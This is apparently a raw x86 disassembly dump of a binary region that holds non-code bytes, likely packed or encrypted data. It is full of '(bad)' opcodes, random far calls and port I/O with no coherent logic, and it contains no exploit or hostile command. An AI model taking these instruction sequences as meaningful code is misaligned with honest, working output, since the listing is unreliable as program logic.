  41fb1d:	pop    edi
  41fb1e:	fsubr  DWORD PTR [eax-0x5477a02e]
  41fb24:	dec    ebp
  41fb25:	mov    esi,DWORD PTR [eax]
  41fb27:	in     al,dx
  41fb28:	scas   eax,DWORD PTR es:[edi]
  41fb29:	scas   al,BYTE PTR es:[edi]
  41fb2a:	add    DWORD PTR [eax-0x20],edx
  41fb2d:	xchg   edi,eax
  41fb2e:	test   BYTE PTR [ebx-0x39],dh
  41fb31:	cmp    dh,BYTE PTR fs:[ebx-0x2c]
  41fb35:	int3   
  41fb36:	mov    ebx,0xc7aee10c
  41fb3b:	fcmovnbe st,st(0)
  41fb3d:	mov    ds:0x8f3d65a4,eax
  41fb42:	sbb    ah,BYTE PTR [edx+esi*4+0x59208c34]
  41fb49:	into   
  41fb4a:	imul   ebx,DWORD PTR [bx+si-0x3057],0xa2434c4f
  41fb53:	mov    WORD PTR [eax-0x7],ds
  41fb56:	sbb    al,ch
  41fb58:	xor    BYTE PTR [ebx+0x2d],al
  41fb5b:	adc    edi,DWORD PTR [edi]
  41fb5d:	or     eax,0xc1a42119
  41fb62:	add    eax,0x41e8fb22
  41fb67:	test   al,0xdc
  41fb69:	(bad)  
  41fb6a:	test   ah,dl
  41fb6c:	mov    WORD PTR gs:[edi-0x2caaf849],cs
  41fb73:	mov    dh,0x9c
  41fb75:	lods   al,BYTE PTR ds:[esi]
  41fb76:	sub    DWORD PTR [edi+0x5bc81667],edx
  41fb7c:	or     DWORD PTR [ebx+0x777f8699],ecx
  41fb82:	push   0xe
  41fb84:	or     bh,BYTE PTR [edx-0x31]
  41fb87:	fs cmc 
  41fb89:	or     ebp,DWORD PTR [eax]
  41fb8b:	and    DWORD PTR [ecx],edi
  41fb8d:	lea    eax,[esi+eiz*1+0x0]
	...
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	xchg   DWORD PTR [ecx+0x51d4ed9e],esi
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	sbb    DWORD PTR [eax+ebx*2],0xe5f6a42c
  41fc13:	sbb    eax,0x49fca026
  41fc18:	jo     0x41fc55
  41fc1a:	call   0xd2ff:0xa4de7a44
  41fc21:	pop    ebx
  41fc22:	mov    ecx,0xf717e44a
  41fc27:	not    DWORD PTR [ebp+0x3447ddf8]
  41fc2d:	jne    0x41fc3a
  41fc2f:	cs cmp eax,0x8ab5b9bc
  41fc35:	or     dl,BYTE PTR [ebp-0x5a0d21c7]
  41fc3b:	pop    ds
  41fc3c:	lahf   
  41fc3d:	nop
  41fc3e:	rol    BYTE PTR [edi],cl
  41fc40:	and    DWORD PTR [edx+0x55e8f31c],edi
  41fc46:	or     ecx,DWORD PTR [ebp-0x10]
  41fc49:	clc    
  41fc4a:	lahf   
  41fc4b:	out    dx,al
  41fc4c:	(bad)
  41fc50:	lea    ebp,[edx+0x6]
  41fc53:	pop    ss
  41fc54:	mov    ds:0x561e18d0,al
  41fc59:	or     BYTE PTR [edi-0x11],0xe2
  41fc5d:	mov    ecx,0x4d41a2cf
  41fc62:	inc    edx
  41fc63:	inc    eax
  41fc64:	stc    
  41fc65:	fs mov eax,0xd81292cb
  41fc6b:	jmp    0x41fcc0
  41fc6d:	nop
  41fc6e:	push   ebp
  41fc6f:	out    dx,al
  41fc70:	mov    dl,0xdf
  41fc72:	jecxz  0x41fc55
  41fc74:	mov    bh,0x98
  41fc76:	out    dx,al
  41fc77:	mov    bh,0xcd
  41fc79:	or     cl,BYTE PTR [edx-0x3e]
  41fc7c:	fisttp WORD PTR [esi+0x6a]
  41fc7f:	sbb    al,0x6b
  41fc81:	inc    ecx
  41fc82:	je     0x41fd02
  41fc84:	inc    esp
  41fc85:	mov    cl,0xf1
  41fc87:	imul   esp,DWORD PTR [ebx+0x1d],0x1661b5f6
  41fc8e:	and    DWORD PTR [ecx+0x46],edi
  41fc91:	pop    ebp
  41fc92:	cmp    eax,0x602e1e1f
  41fc97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc98:	or     bh,BYTE PTR [ebp-0x73589dce]
  41fc9e:	repz ficomp WORD PTR [ecx+0x6a47ffbf]
  41fca5:	adc    edx,DWORD PTR [esi]
  41fca7:	push   edi
  41fca8:	sbb    al,0x5e
  41fcaa:	mov    edx,0xda1c120
  41fcaf:	daa    
  41fcb0:	leave  
  41fcb1:	in     eax,dx
  41fcb2:	repnz mov dl,0xca
  41fcb5:	(bad)  
  41fcb7:	mov    edi,0x38007efa
  41fcbc:	addr16 jle 0x41fcdf
  41fcbf:	lods   eax,DWORD PTR ds:[esi]
  41fcc0:	push   ecx
  41fcc1:	das    
  41fcc2:	out    dx,eax
  41fcc3:	sub    BYTE PTR [ebx-0x3ccfefa0],ah
  41fcc9:	jp     0x41fcc4
  41fccb:	mov    al,ds:0xf034ff36
  41fcd0:	xchg   ebx,eax
  41fcd1:	je     0x41fd12
  41fcd3:	xchg   ebp,eax
  41fcd4:	aas    
  41fcd5:	inc    DWORD PTR [ebx-0x35f05e01]
  41fcdb:	lods   eax,DWORD PTR ds:[esi]
  41fcdc:	push   ds
  41fcdd:	mov    eax,0x6cf10c66
  41fce2:	or     eax,0x7de4de40
  41fce7:	inc    ecx
  41fce8:	into   
  41fce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcea:	dec    edi
  41fceb:	inc    edx
  41fcec:	push   eax
  41fced:	mov    WORD PTR [esi+0x3eef54f8],?
  41fcf3:	or     ebx,DWORD PTR [edi-0x17]
  41fcf6:	sti    
  41fcf7:	in     eax,dx
  41fcf8:	shl    BYTE PTR [ebp+0x1ece2c03],1
  41fcfe:	pop    ebp
  41fcff:	lods   eax,DWORD PTR ds:[esi]
  41fd00:	aaa    
  41fd01:	inc    eax
  41fd02:	(bad)  
  41fd03:	into   
  41fd04:	cs int 0x2f
  41fd07:	dec    esi
  41fd08:	ja     0x41fd7c
  41fd0a:	sbb    eax,0xf49db295
  41fd0f:	push   edi
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	ja     0x41fd46
  41fd82:	mov    ah,0xe0
  41fd84:	fcom   DWORD PTR [edx+0x1]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	dec    eax
  41fd8d:	add    al,0x9c
  41fd8f:	pushf  
  41fd90:	push   0x493c67bb
  41fd95:	repz mov eax,ds:0xc253cd43
  41fd9b:	fnstsw WORD PTR [eax-0x5b]
  41fd9e:	xor    al,0x57
  41fda0:	jg     0x41fd56
  41fda2:	imul   ebx,DWORD PTR [edx+ebp*1],0x1401cb09
  41fda9:	pop    eax
  41fdaa:	inc    esi
  41fdab:	mov    esp,0x198c678a
  41fdb0:	push   ebx
  41fdb1:	data16 jnp 0x41fda6
  41fdb4:	rcr    DWORD PTR [ecx-0x7fd883fa],cl
  41fdba:	push   ds
  41fdbb:	addr16 and eax,0xb2162d20
  41fdc1:	dec    edi
  41fdc2:	add    BYTE PTR [ecx],al
  41fdc4:	es add ecx,edi
  41fdc7:	inc    esi
  41fdc8:	sti    
  41fdc9:	add    DWORD PTR [edx],edi
  41fdcb:	dec    ebp
  41fdcc:	cmp    dl,BYTE PTR [ecx]
  41fdce:	push   ds
  41fdcf:	jg     0x41fd92
  41fdd1:	sbb    DWORD PTR [esi+eax*4],eax
  41fdd4:	pop    edx
  41fdd5:	mov    cl,BYTE PTR [edx-0x5cc111ab]
  41fddb:	pop    ax
  41fddd:	pop    esp
  41fdde:	jno    0x41fe2d
  41fde0:	inc    ecx
  41fde1:	xor    eax,0x2c950f32
  41fde6:	fcmovnbe st,st(6)
  41fde8:	test   BYTE PTR [edi+0x13],ah
  41fdeb:	pop    ds
  41fdec:	aas    
  41fded:	mov    fs,WORD PTR [ebp-0x4ba59f91]
  41fdf3:	rol    DWORD PTR [edx],cl
  41fdf5:	mov    BYTE PTR [ebx-0x45eec8a5],ah
  41fdfb:	outs   dx,DWORD PTR ds:[esi]
  41fdfc:	out    dx,al
  41fdfd:	mov    esp,0xf3b8f7ac
  41fe02:	lea    esi,[edi-0x40]
  41fe05:	cmp    dl,BYTE PTR [eax+0x53]
  41fe08:	sub    eax,0xefb2e2f0
  41fe0d:	cmp    eax,DWORD PTR [eax-0xc]
  41fe10:	pop    edx
  41fe11:	dec    ecx
  41fe12:	xchg   edx,eax
  41fe13:	cmp    BYTE PTR [esp+ebx*1-0x6ba0fb36],0x23
  41fe1b:	mul    BYTE PTR [edx-0x1c]
  41fe1e:	xchg   ebx,eax
  41fe1f:	mov    ecx,0x1127edd9
  41fe24:	das    
  41fe25:	addr16 ss pop ebx
  41fe28:	jl     0x41fe46
  41fe2a:	or     esp,ebx
  41fe2c:	add    al,0x9
  41fe2e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41fe30:	ds enter 0x28e7,0xc
  41fe35:	xchg   ebp,eax
  41fe36:	push   eax
  41fe37:	gs mov ebx,gs
  41fe3a:	(bad)  
  41fe3b:	dec    BYTE PTR [ebp-0x5921e541]
  41fe41:	pop    ecx
  41fe42:	inc    edi
  41fe43:	mov    edi,0x6f25eb71
  41fe48:	inc    esp
  41fe49:	pop    esp
  41fe4a:	arpl   WORD PTR [edi],dx
  41fe4c:	and    al,0x68
  41fe4e:	je     0x41fecf
  41fe50:	popf   
  41fe51:	pop    es
  41fe52:	sbb    DWORD PTR [ebx-0x9],esp
  41fe55:	pop    ds
  41fe56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe57:	adc    esp,eax
  41fe59:	dec    eax
  41fe5a:	popf   
  41fe5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe5c:	enter  0xd354,0x1c
  41fe60:	ds xchg edx,eax
  41fe62:	pop    edx
  41fe63:	fldcw  WORD PTR [edi]
  41fe65:	jg     0x41fe3b
  41fe67:	adc    BYTE PTR [eax-0x43],ah
  41fe6a:	mov    ds:0x1203203a,al
  41fe6f:	(bad)  
  41fe70:	dec    ecx
  41fe71:	nop
  41fe72:	test   DWORD PTR [edx+0x31f49fe3],eax
  41fe78:	mov    bh,0xde
  41fe7a:	fiadd  DWORD PTR [eax+0x2945ab88]
  41fe80:	pusha  
  41fe81:	fwait
  41fe82:	cmp    al,0x92
  41fe84:	(bad)  
  41fe86:	test   bl,ch
  41fe88:	adc    ah,bh
  41fe8a:	or     eax,0xf41b194a
  41fe8f:	repz add BYTE PTR [eax],al
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x5e
  41ff01:	test   BYTE PTR [ebp+0x153dc1d],bh
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	call   0x35a3:0x729c4c2e
  41ff13:	pop    edx
  41ff14:	xor    bh,BYTE PTR es:[edx+eiz*1+0x158005f8]
  41ff1c:	je     0x41ff6f
  41ff1e:	inc    ebx
  41ff1f:	das    
  41ff20:	loope  0x41ff56
  41ff22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff24:	jmp    0x41ff17
  41ff26:	xchg   ecx,eax
  41ff27:	ins    DWORD PTR es:[edi],dx
  41ff28:	mov    ebx,DWORD PTR [ebx]
  41ff2a:	fbstp  TBYTE PTR [edi-0x47db9757]
  41ff30:	scas   al,BYTE PTR es:[edi]
  41ff31:	add    ah,BYTE PTR [eax+esi*4+0x6e]
  41ff35:	xchg   ebp,eax
  41ff36:	push   ebp
  41ff37:	mov    esp,0xc9a69c5e
  41ff3c:	test   BYTE PTR [eax+edx*1+0x1b],ah
  41ff40:	xchg   edi,eax
  41ff41:	ret    0x5d13
  41ff44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff45:	mov    dl,0xb3
  41ff47:	adc    eax,0xec4a6b62
  41ff4c:	pop    esp
  41ff4d:	adc    DWORD PTR [ecx+0x13],eax
  41ff50:	out    0xb1,eax
  41ff52:	icebp  
  41ff53:	mov    ebp,0x54247384
  41ff58:	clc    
  41ff59:	rol    BYTE PTR [edx-0x62f82edf],1
  41ff5f:	dec    edi
  41ff60:	or     ecx,esi
  41ff62:	test   eax,0x7b7b634d
  41ff67:	arpl   WORD PTR [edx],dx
  41ff69:	lds    ebx,FWORD PTR [ecx-0x1b7f0810]
  41ff6f:	dec    edi
  41ff70:	push   edx
  41ff71:	mov    DWORD PTR [eax],ecx
  41ff73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff74:	popa   
  41ff75:	(bad)  
  41ff76:	shl    DWORD PTR [esi-0x2204261a],cl
  41ff7c:	sbb    ch,dh
  41ff7e:	outs   dx,BYTE PTR ds:[esi]
  41ff7f:	adc    esp,DWORD PTR [edi-0x2df23f0]
  41ff85:	fwait
  41ff86:	jg     0x41ffc4
  41ff88:	in     al,dx
  41ff89:	jmp    0x2fce:0x8197ee97
  41ff90:	call   0x1b0e2188
  41ff95:	fdivr  st,st(4)
  41ff97:	pop    es
  41ff98:	sub    eax,0x86e4576e
  41ff9d:	ss dec eax
  41ff9f:	iret   
  41ffa0:	popa   
  41ffa1:	fisttp QWORD PTR [ebp-0x6f]
  41ffa4:	or     BYTE PTR [edx],ah
  41ffa6:	sar    BYTE PTR [esp+ecx*2-0x20e2cb0d],cl
  41ffad:	retf   
  41ffae:	ss pop ds
  41ffb0:	dec    ebp
  41ffb1:	stos   BYTE PTR es:[edi],al
  41ffb2:	cmp    DWORD PTR [eax+0x1d0d4859],esi
  41ffb8:	in     eax,dx
  41ffb9:	push   ebx
  41ffba:	add    DWORD PTR ds:0xa6796bf,0xffffffc0
  41ffc1:	ss stos BYTE PTR es:[edi],al
  41ffc3:	xor    dl,BYTE PTR [edi+0x1ef415e6]
  41ffc9:	xchg   esi,eax
  41ffca:	je     0x41ff66
  41ffcc:	adc    eax,0x1da68bfa
  41ffd1:	mov    dl,0x3a
  41ffd3:	ss loopne 0x41ffea
  41ffd6:	retf   0xe31c
  41ffd9:	xor    cl,BYTE PTR [esi-0x52f483e1]
  41ffdf:	sbb    al,0xd7
  41ffe1:	xchg   DWORD PTR [ebx+0x4bafe34],ebx
  41ffe7:	cmp    eax,0xfb0e3717
  41ffec:	jmp    0xceeb:0x4095e163
  41fff3:	jns    0x420061
  41fff5:	mov    bh,BYTE PTR ds:0x89ca84d0
  41fffb:	pushf  
  41fffc:	and    BYTE PTR [esi],0xcb
  41ffff:	pop    esp
  420000:	shl    DWORD PTR [edx+0x73f52a26],1
  420006:	lods   eax,DWORD PTR ds:[esi]
  420007:	dec    esi
  420008:	sti    
  420009:	dec    esi
  42000a:	outs   dx,DWORD PTR ds:[esi]
  42000b:	fcomp  QWORD PTR [ecx+edx*4]
  42000e:	adc    eax,DWORD PTR [eax+eax*1]
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x52
  420081:	mov    eax,0x54e007ec
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	es in  al,0x5f
  42008f:	jbe    0x42003d
  420091:	or     eax,0xa716e27c
  420096:	xchg   esi,eax
  420097:	mov    ds:0xa5750ca7,eax
  42009c:	mov    ebp,0xd630a1f2
  4200a1:	jl     0x420122
  4200a3:	cmp    cl,BYTE PTR [esi]
  4200a5:	test   eax,0x1a54900d
  4200aa:	mov    edx,0x1f3566de
  4200af:	cmp    bh,bl
  4200b1:	or     eax,0xd0c04a03
  4200b6:	ins    DWORD PTR es:[edi],dx
  4200b7:	ja     0x420056
  4200b9:	fisttp DWORD PTR [ebx-0x204a5575]
  4200bf:	(bad)  
  4200c0:	lock mov dh,0xc8
  4200c3:	pop    es
  4200c4:	mov    al,BYTE PTR [ebp+0x1f]
  4200c7:	in     al,dx
  4200c8:	jo     0x4200b9
  4200ca:	or     eax,0x78b2deb2
  4200cf:	cwde   
  4200d0:	dec    edx
  4200d1:	mov    di,0xa2ec
  4200d5:	push   cs
  4200d6:	shl    BYTE PTR [ebp+0x4b],0xa4
  4200da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200db:	test   DWORD PTR [eax-0x61],eax
  4200de:	loopne 0x420117
  4200e0:	ja     0x4200dc
  4200e2:	dec    edi
  4200e3:	or     DWORD PTR [ecx],edi
  4200e5:	enter  0x8cd,0xfd
  4200e9:	jmp    0x64914bd
  4200ee:	popa   
  4200ef:	sub    esi,edi
  4200f1:	ret    
  4200f2:	clc    
  4200f3:	sti    
  4200f4:	mov    eax,ds:0xa3fb1afe
  4200f9:	(bad)  
  4200fa:	rol    DWORD PTR [ecx],1
  4200fc:	pop    ds
  4200fd:	or     ch,BYTE PTR [ecx-0x1d8ce1b5]
  420103:	sub    al,0xc0
  420105:	and    ecx,DWORD PTR [esi+0x48845697]
  42010b:	add    DWORD PTR [eax+0x26],ebx
  42010e:	and    DWORD PTR [ebp-0x63eb1500],ebp
  420114:	push   ds
  420115:	inc    edi
  420116:	nop
  420117:	mov    DWORD PTR [esp+ebx*1+0x49],esi
  42011b:	adc    DWORD PTR [ecx],ecx
  42011d:	mov    bl,0xf6
  42011f:	sbb    DWORD PTR [edi+0x25],esi
  420122:	mov    cl,0x21
  420124:	cdq    
  420125:	fdivp  st(4),st
  420127:	sub    DWORD PTR [ebx+0x29],edi
  42012a:	dec    ebx
  42012b:	mov    ah,bh
  42012d:	sbb    BYTE PTR [ebx-0x3a29a741],bl
  420133:	and    bh,bh
  420135:	and    ebp,DWORD PTR [eax+0x6124e669]
  42013b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42013c:	iret   
  42013d:	jno    0x42012e
  42013f:	rol    BYTE PTR [eax+0x15],1
  420142:	test   BYTE PTR [edi+0x42],ch
  420145:	aas    
  420146:	mov    ds:0xeecec31f,eax
  42014b:	xor    DWORD PTR [ebx-0x22fe0346],ebp
  420151:	neg    BYTE PTR [ebx-0x40ed89fc]
  420157:	lods   eax,DWORD PTR ds:[esi]
  420158:	in     eax,0x96
  42015a:	mov    ebx,0x98dca050
  42015f:	jmp    0x2c26a02
  420164:	stc    
  420165:	(bad)  
  420166:	in     al,dx
  420167:	mov    ds:0x2931c25c,eax
  42016c:	adc    dl,BYTE PTR [eax-0x16f138b4]
  420172:	pop    esp
  420173:	ret    
  420174:	xor    DWORD PTR [ecx],ecx
  420176:	pushf  
  420177:	xchg   ebp,eax
  420178:	inc    ebp
  420179:	inc    esp
  42017a:	aad    0x64
  42017c:	popa   
  42017d:	mov    edi,ebx
  42017f:	bnd jnp 0x4201f6
  420182:	dec    ebp
  420183:	fucomp st(1)
  420186:	push   cs
  420187:	adc    al,0x7e
  420189:	add    edi,DWORD PTR [ecx+0x2d87d12e]
  42018f:	loopne 0x420191
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x25972116],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	in     al,0x1
  42020e:	fcomp  DWORD PTR [ebx+ebx*1-0x3d1dd6dc]
  420215:	pop    ss
  420216:	outs   dx,DWORD PTR ds:[esi]
  420217:	cmp    DWORD PTR ds:0xa8c8024e,0xd8481d00
  420221:	sub    al,0xfc
  420223:	pop    ebp
  420224:	or     eax,0x2d503f54
  420229:	inc    ebp
  42022a:	das    
  42022b:	cdq    
  42022c:	lea    esp,[esi-0x1e]
  42022f:	push   0x641dbe92
  420234:	ins    DWORD PTR es:[edi],dx
  420235:	jbe    0x4201c2
  420237:	dec    esp
  420238:	sub    edi,DWORD PTR [esi]
  42023a:	sti    
  42023b:	and    DWORD PTR [ebx+0x597101d5],edi
  420241:	fld    TBYTE PTR [edx]
  420243:	mov    ds:0x52c9d0da,al
  420248:	push   esp
  420249:	jge    0x4202c4
  42024b:	sahf   
  42024c:	jmp    0x4996:0x92b09c0d
  420253:	push   edi
  420254:	nop
  420255:	ss out dx,al
  420257:	(bad)  
  420258:	call   0xf5e94025
  42025d:	and    DWORD PTR [ecx+0x6d],ebx
  420260:	out    0x8f,al
  420262:	int    0xe
  420264:	mov    ah,0x3f
  420266:	ret    
  420267:	xchg   ebp,eax
  420268:	dec    ecx
  420269:	mov    bh,0x6b
  42026b:	das    
  42026c:	imul   edi,ebp,0xffffffc4
  42026f:	fcmovnb st,st(5)
  420271:	add    edx,DWORD PTR [ecx-0x3f]
  420274:	add    ah,cl
  420276:	cmp    bh,BYTE PTR [eax+ebx*1-0x15c52a51]
  42027d:	sub    al,0x99
  42027f:	push   ecx
  420280:	or     ch,al
  420282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420283:	mov    BYTE PTR [edi+0x4fefd514],bl
  420289:	cld    
  42028a:	and    eax,0x76f3fe96
  42028f:	xchg   ebx,ebp
  420291:	loopne 0x42029a
  420293:	aaa    
  420294:	dec    ecx
  420295:	rcl    BYTE PTR [esi],0x12
  420298:	mov    esp,esi
  42029a:	push   es
  42029b:	jnp    0x42028b
  42029d:	push   eax
  42029e:	enter  0x3ae1,0x30
  4202a2:	cmp    bl,bh
  4202a4:	int    0x3
  4202a6:	in     eax,dx
  4202a7:	sub    eax,0x60422fc4
  4202ac:	cwde   
  4202ad:	leave  
  4202ae:	dec    sp
  4202b0:	jp     0x42032a
  4202b2:	and    DWORD PTR [edi+ebx*4-0x22d29aa3],esp
  4202b9:	or     ebx,0xffffffec
  4202bc:	adc    DWORD PTR [ecx],edi
  4202be:	neg    BYTE PTR ds:0xe252fb18
  4202c4:	ss daa 
  4202c6:	aam    0xcd
  4202c8:	popa   
  4202c9:	mov    al,0x43
  4202cb:	mov    ch,0x52
  4202cd:	pop    ecx
  4202ce:	ror    BYTE PTR [esi+0x75412fa7],0x30
  4202d5:	push   ebx
  4202d6:	xchg   edx,eax
  4202d7:	enter  0xe100,0xaa
  4202db:	(bad)  
  4202dd:	pop    ebx
  4202de:	aam    0x79
  4202e0:	pop    ebp
  4202e1:	and    ah,BYTE PTR [eax-0x2b]
  4202e4:	dec    edx
  4202e5:	(bad)  
  4202e6:	xor    ch,dl
  4202e8:	loope  0x4202c8
  4202ea:	das    
  4202eb:	rcl    BYTE PTR [ebx-0x59a59b97],0x7d
  4202f2:	das    
  4202f3:	into   
  4202f4:	add    eax,0xc581b00
  4202f9:	pop    ebp
  4202fa:	dec    ecx
  4202fb:	push   es
  4202fc:	mov    ebx,0x946d8482
  420301:	inc    eax
  420302:	dec    edx
  420303:	adc    ch,BYTE PTR [ecx+0x22fb39ab]
  420309:	cmp    edi,edx
  42030b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030c:	pop    ds
  42030d:	(bad)  
  42030e:	push   edi
  42030f:	fild   DWORD PTR [eax]
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	xchg   ecx,eax
  420381:	lods   eax,DWORD PTR es:[esi]
  420383:	in     eax,dx
  420384:	call   0x44204df
  420389:	add    DWORD PTR [eax],eax
  42038b:	add    BYTE PTR [esi+0x13450238],al
  420391:	push   edx
  420392:	cs push ss
  420394:	fwait
  420395:	js     0x4203a3
  420397:	in     al,0x84
  420399:	stc    
  42039a:	in     eax,0x69
  42039c:	jo     0x4203d1
  42039e:	dec    eax
  42039f:	out    0x33,al
  4203a1:	xor    al,0x76
  4203a3:	pop    DWORD PTR [edi+ecx*8-0x4e]
  4203a7:	dec    ebx
  4203a8:	in     eax,0x50
  4203aa:	mov    esi,0x84bc6a2
  4203af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203b0:	mov    ecx,0xc142469c
  4203b5:	dec    edi
  4203b6:	or     ah,bh
  4203b8:	push   eax
  4203b9:	int    0xfb
  4203bb:	xor    BYTE PTR [eax+ecx*4+0x21],ch
  4203bf:	adc    eax,0x2b16387e
  4203c4:	std    
  4203c5:	daa    
  4203c6:	push   edx
  4203c7:	cld    
  4203c8:	mov    cl,0x52
  4203ca:	dec    esi
  4203cb:	mov    bl,0xcb
  4203cd:	outs   dx,BYTE PTR ds:[esi]
  4203ce:	add    eax,0xbe71165e
  4203d3:	(bad)  
  4203d5:	cmp    BYTE PTR [edi-0x3e4b1ea7],cl
  4203db:	je     0x42039c
  4203dd:	les    esi,FWORD PTR [ecx-0x7e429fc1]
  4203e3:	clc    
  4203e4:	xchg   DWORD PTR [edi],ebx
  4203e6:	xlat   BYTE PTR ds:[ebx]
  4203e7:	out    dx,al
  4203e8:	mov    ch,BYTE PTR [ebx]
  4203ea:	jg     0x420389
  4203ec:	adc    al,0x4a
  4203ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ef:	mov    ecx,0xe015dedd
  4203f4:	neg    eax
  4203f6:	loop   0x420415
  4203f8:	or     eax,0xd71309fc
  4203fd:	popf   
  4203fe:	je     0x4203c3
  420400:	imul   edx,DWORD PTR [edx+0x6d1f3bae],0x15060e2d
  42040a:	pushf  
  42040b:	lods   al,BYTE PTR fs:[esi]
  42040d:	ins    BYTE PTR es:[edi],dx
  42040e:	int3   
  42040f:	int    0xf3
  420411:	cli    
  420412:	rcl    bl,1
  420414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420415:	add    esp,esi
  420417:	clc    
  420418:	push   0x788e9dd5
  42041d:	stos   BYTE PTR es:[edi],al
  42041e:	mov    eax,DWORD PTR [ecx-0x1798ba85]
  420424:	iret   
  420425:	inc    ebp
  420426:	imul   esp,ecx,0x5f
  420429:	push   esp
  42042a:	loopne 0x4203b7
  42042c:	je     0x420422
  42042e:	push   ebx
  42042f:	adc    al,0x67
  420431:	dec    edi
  420432:	xchg   ecx,eax
  420433:	dec    edx
  420434:	pop    esi
  420435:	cmp    ecx,DWORD PTR [esp+esi*8+0x2c]
  420439:	jg     0x4203df
  42043b:	cld    
  42043c:	push   0x65453dee
  420441:	cmp    eax,0x1346c662
  420446:	lods   eax,DWORD PTR ds:[esi]
  420448:	dec    BYTE PTR ds:0x8740
  42044d:	mov    ch,0xe9
  42044f:	sbb    al,0x23
  420451:	add    BYTE PTR [edi],cl
  420453:	mov    dl,0xfb
  420455:	je     0x420419
  420457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420458:	add    al,0x87
  42045a:	mov    eax,0xbbd6c383
  42045f:	ret    
  420460:	sti    
  420461:	jno    0x420412
  420463:	dec    eax
  420464:	mov    edx,0xb401718
  420469:	adc    ecx,ecx
  42046b:	or     esi,DWORD PTR [edi+0x7f0c1486]
  420471:	arpl   WORD PTR ds:0x4fd52ec1,sp
  420477:	scas   al,BYTE PTR es:[edi]
  420478:	lods   al,BYTE PTR ds:[esi]
  420479:	sub    bl,bh
  42047b:	and    DWORD PTR [edi],ecx
  42047d:	mov    ds:0x18724058,eax
  420482:	dec    esi
  420483:	pop    esp
  420484:	sbb    ebx,DWORD PTR [esi]
  420486:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  420488:	jecxz  0x420508
  42048a:	jne    0x420431
  42048c:	push   esi
  42048d:	scas   al,BYTE PTR es:[edi]
  42048e:	sti    
  42048f:	sbb    DWORD PTR [eax],eax
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	scas   eax,DWORD PTR es:[edi]
  420501:	cwde   
  420502:	fbld   TBYTE PTR [ebp-0x14]
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	pop    ds
  42050d:	scas   eax,DWORD PTR es:[edi]
  42050e:	dec    esi
  42050f:	in     eax,dx
  420510:	mov    edi,0xc5e8074e
  420515:	fwait
  420516:	daa    
  420517:	ret    
  420518:	inc    edx
  420519:	pop    es
  42051a:	inc    edi
  42051b:	xchg   edi,eax
  42051c:	adc    eax,DWORD PTR [eax]
  42051e:	scas   eax,DWORD PTR es:[edi]
  42051f:	pop    ebx
  420520:	dec    esi
  420521:	ds push es
  420523:	ret    0xc219
  420526:	mov    BYTE PTR [edi+0x6],dh
  420529:	xlat   BYTE PTR ds:[ebx]
  42052a:	cmp    dh,BYTE PTR [eax-0x3e2f6b22]
  420530:	gs jns 0x42054e
  420533:	(bad)  
  420534:	je     0x42055d
  420536:	ror    BYTE PTR [esi],1
  420538:	mov    ebp,0x6fcb94ea
  42053d:	addr16 push edi
  42053f:	inc    esi
  420540:	nop
